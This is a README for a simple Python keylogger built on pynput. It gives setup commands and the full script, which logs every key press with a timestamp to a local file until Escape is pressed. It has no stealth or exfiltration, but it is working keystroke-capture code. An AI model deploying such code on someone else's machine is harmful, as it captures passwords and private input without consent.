Key Logger
This Python script logs all key presses to a file named key_log.txt using the pynput library. The script runs continuously and records each key press along with a timestamp until the "Escape" key (Key.esc) is pressed to stop the logging.

Prerequisites
Python 3.x
pynput library
Installation
Clone the repository or download the script:

sh
Copy code
git clone https://github.com/yourusername/yourrepository.git
cd yourrepository
Install the required libraries:

sh
Copy code
pip install pynput
Usage
Run the script:

sh
Copy code
python key_logger.py
The script will start logging all key presses to key_log.txt file in the same directory:

The log entries will be in the format: (key) is pressed at : timestamp.
To stop the script, press the "Escape" key (Key.esc).

Script Overview
python
Copy code
from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format='%(message)s : %(asctime)s')
print("Running....")

def while_press(key):
    KEY = f"({key}) is pressed at "
    logging.info(KEY)

def while_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=while_press, on_release=while_release) as listener:
    listener.join()
Functions
while_press(key):

Logs the key press event along with the timestamp to key_log.txt.
while_release(key):

Stops the listener when the "Escape" key is pressed.
